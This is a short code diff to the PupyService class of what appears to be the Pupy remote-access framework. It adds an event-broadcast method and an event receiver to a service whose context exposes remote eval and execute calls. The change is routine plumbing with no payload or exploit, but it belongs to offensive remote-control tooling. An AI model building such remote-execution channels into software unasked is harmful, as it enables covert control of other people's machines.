@@ -47,6 +47,8 @@ class PupyService(rpyc.Service):
         self.infos = None
         self.get_infos = None
 
+        self.events_receiver = None
+
     def exposed_on_connect(self):
         self._conn._config.update(dict(
             allow_safe_attrs = False,
@@ -73,7 +75,7 @@ class PupyService(rpyc.Service):
             obtain_call,
             remote_exit, remote_eval, remote_execute,
             pupyimporter,
-            infos
+            infos, *args
        ):
         self.namespace = namespace
         self.modules = modules
@@ -167,6 +169,12 @@ class PupyService(rpyc.Service):
             data = zlib.compress(data)
 
         return data
+
+    def exposed_broadcast_event(self, eventid):
+        logger.info('Event received: %08x', eventid)
+        if self.events_receiver:
+            self.events_receiver(eventid)
+            logger.info('Event handled: %08x', eventid)
 
 class PupyBindService(PupyService):
     def exposed_get_password(self):
